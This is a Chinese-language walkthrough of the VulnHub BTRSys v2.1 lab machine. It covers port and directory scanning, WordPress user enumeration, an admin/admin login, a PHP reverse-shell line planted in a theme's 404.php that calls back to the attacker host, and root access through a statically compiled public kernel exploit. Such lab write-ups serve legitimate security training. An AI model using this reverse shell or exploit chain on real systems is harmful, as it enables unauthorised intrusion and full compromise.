# BTRSys: v2.1

2024-5-22 https://www.vulnhub.com/entry/btrsys-v21,196/

difficulty: Beginner / Intermediate

## IP

192.168.10.183

## Scan

Open Port -> 21,22,80

```
PORT   STATE SERVICE VERSION
21/tcp open  ftp     vsftpd 3.0.3
|_ftp-anon: Anonymous FTP login allowed (FTP code 230)
| ftp-syst:
|   STAT:
| FTP server status:
|      Connected to ::ffff:192.168.10.3
|      Logged in as ftp
|      TYPE: ASCII
|      No session bandwidth limit
|      Session timeout in seconds is 300
|      Control connection is plain text
|      Data connections will be plain text
|      At session startup, client count was 1
|      vsFTPd 3.0.3 - secure, fast, stable
|_End of status
22/tcp open  ssh     OpenSSH 7.2p2 Ubuntu 4ubuntu2.1 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey:
|   2048 08eee3ff3120876c12e71caac4e754f2 (RSA)
|   256 ade11c7de78676be9aa8bdb968927787 (ECDSA)
|_  256 0ce1eb060c5cb5cc1bd1fa5606223167 (ED25519)
80/tcp open  http    Apache httpd 2.4.18 ((Ubuntu))
|_http-title: Site doesn't have a title (text/html).
| http-robots.txt: 1 disallowed entry
|_Hackers
|_http-server-header: Apache/2.4.18 (Ubuntu)
```

21 ftp 允许匿名登陆，但是里面没信息。

22 ssh banner 也没显示出什么信息。

只有看 80 端口了，http://192.168.10.183/ 首页是个动图，源代码没信息，使用 gobuster 进行扫描：

```
gobuster -t 64 dir -u http://192.168.10.183/ -k -w /usr/share/wordlists/dirbuster/directory-list-lowercase-2.3-medium.txt -x php,txt,html -e

http://192.168.10.183/index.html           (Status: 200) [Size: 81]
http://192.168.10.183/upload               (Status: 301) [Size: 317] [--> http://192.168.10.183/upload/]
http://192.168.10.183/wordpress            (Status: 301) [Size: 320] [--> http://192.168.10.183/wordpress/]
http://192.168.10.183/javascript           (Status: 301) [Size: 321] [--> http://192.168.10.183/javascript/]
http://192.168.10.183/robots.txt           (Status: 200) [Size: 1451]
```

http://192.168.10.183/upload/ 页面显示报错：

```
Connection failed: SQLSTATE[HY000] [1049] Unknown database 'Lepton'
```

http://192.168.10.183/robots.txt 内容：

```
Disallow: Hackers
Allow: /wordpress/
```

重点估计就是 /wordpress/ 目录，继续用 gobuster 对目录进行扫描：

```
gobuster -t 64 dir -u http://192.168.10.183/wordpress/ -k -w /usr/share/wordlists/dirbuster/directory-list-lowercase-2.3-medium.txt -x php,txt,html -e
```

没发现什么非 wp 目录，使用 wpscan 进行扫描：

```
wpscan --url http://192.168.10.183/wordpress/ -e
```

搜集到了 2 个用户:btrisk、admin

尝试使用弱密码登陆，结果 admin 的密码是 admin。

theme 不能上传，文件夹写不了，只好修改 404.php 页面，写入反弹的 shell：

```
http://192.168.10.183/wordpress/wp-admin/theme-editor.php?file=404.php&theme=twentyfourteen

$sock=fsockopen("192.168.10.3",8888);exec("/bin/bash <&3 >&3 2>&3");
```

kali 上监听 8888 端口，访问下面页面激活 404.php 进行反弹 shell：

```
curl http://192.168.10.183/wordpress/wp-content/themes/twentyfourteen/404.php
```

得到反弹 shell 后，进入 wordpress 目录，查找数据库配置信息：

```
define('DB_USER', 'root');
define('DB_PASSWORD', 'rootpassword!');
define('DB_HOST', 'localhost');
```

/home 目录中有一个 btrisk 用户，看看这个密码是不是这个用户的，su btrisk 输入 config 中配置的密码，不对。

经过其他枚举，sudo、suid、cap、crontab 等等都没找到提权到 btrisk 或者 root 的方法。

看看内核是否有漏洞吧，uname -a Linux ubuntu 4.4.0-62，searchsploit 后找到一个：

```
Linux Kernel < 4.4.0-116 (Ubuntu 16.04.4) - Local Privilege Escalation   | linux/local/44298.c
```

由于目标机器上没有 gcc 编译器，我们需要在 kali 上 c 源码编译好后，将可执行程序下载到目标机器，而且不能使用动态编译，目标机器运行时会提示

```
/lib/x86_64-linux-gnu/libc.so.6: version `GLIBC_2.34' not found
```

需要使用静态编译：

```
gcc 44298.c -o exp -static
```

目标机器执行 exp 后就得到了 root 权限：

```
www-data@ubuntu:/tmp$ chmod +x exp
chmod +x exp1
www-data@ubuntu:/tmp$ ./exp
./exp
id
uid=0(root) gid=0(root) groups=0(root),33(www-data)
cd /root
ls -al
total 32
drwx------  4 root root 4096 Apr 28  2017 .
drwxr-xr-x 22 root root 4096 Mar 17  2017 ..
-rw-------  1 root root  505 May  2  2017 .bash_history
-rw-r--r--  1 root root 3106 Oct 22  2015 .bashrc
drwx------  2 root root 4096 Apr 28  2017 .cache
-rw-------  1 root root  215 Apr 27  2017 .mysql_history
drwxr-xr-x  2 root root 4096 Mar 21  2017 .nano
-rw-r--r--  1 root root  148 Aug 17  2015 .profile
```
